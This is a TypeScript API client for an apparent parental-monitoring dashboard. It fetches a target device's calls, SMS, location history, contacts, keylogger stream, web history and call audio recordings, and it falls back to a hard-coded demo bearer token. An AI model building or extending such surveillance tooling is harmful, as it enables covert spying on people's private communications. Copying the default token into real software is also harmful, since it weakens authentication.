// Relative API helper taking advantage of Vite server proxy (/api -> http://localhost:3000)
async function apiFetch<T>(endpoint: string, fallbackData: T, customHeaders: Record<string, string> = {}): Promise<T> {
  try {
    const cleanEndpoint = endpoint.startsWith('/') ? endpoint : `/${endpoint}`;
    // Ensures global prefix /api/v1/ is formatted correctly
    const path = cleanEndpoint.startsWith('/api/v1') 
      ? cleanEndpoint 
      : `/api/v1${cleanEndpoint.replace(/^\/api/, '')}`;

    const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';

    const response = await fetch(path, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Authorization': `Bearer ${token}`,
        ...customHeaders
      }
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    const data = await response.json();
    return data as T;
  } catch (error) {
    console.warn(`[Dashboard API] Failed to fetch ${endpoint}. Using fallback state.`, error);
    return fallbackData;
  }
}

export const apiService = {
  // 1. Devices List
  async getDevices(fallback: any[]) {
    return apiFetch<any[]>('/api/v1/devices', fallback);
  },

  // 2. Parent User licenses (Authenticated via Bearer Token Header)
  async getLicenses(fallback: any[]) {
    return apiFetch<any[]>('/api/v1/licenses/my-licenses', fallback);
  },

  // 3. Purchase License Simulation
  async purchaseLicense(payload: { email: string; name?: string; packageName: string; months: number; amount: number }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const response = await fetch('/api/v1/licenses/purchase-simulate', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(payload)
      });
      return await response.json();
    } catch (err) {
      return { success: false, message: 'Connection error' };
    }
  },

  // 4. Calls Log
  async getCalls(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/calls/${deviceId}`, fallback);
  },

  // 5. SMS Log
  async getSms(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/sms/${deviceId}`, fallback);
  },

  // 6. Location History
  async getLocations(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/location/${deviceId}`, fallback);
  },

  // 7. Contacts Inventory
  async getContacts(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/contacts/${deviceId}`, fallback);
  },

  // 8. Keylogger Stream
  async getKeylogger(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/keylogger/${deviceId}`, fallback);
  },

  // 9. Installed Applications
  async getInstalledApps(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/installed-apps/${deviceId}`, fallback);
  },

  // 10. Internet History
  async getWebHistory(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/web-history/${deviceId}`, fallback);
  },

  // 11. Calendar Events
  async getCalendar(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/calendar/${deviceId}`, fallback);
  },

  // 12. Call Audio Recordings
  async getRecordings(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/recordings/${deviceId}`, fallback);
  }
};
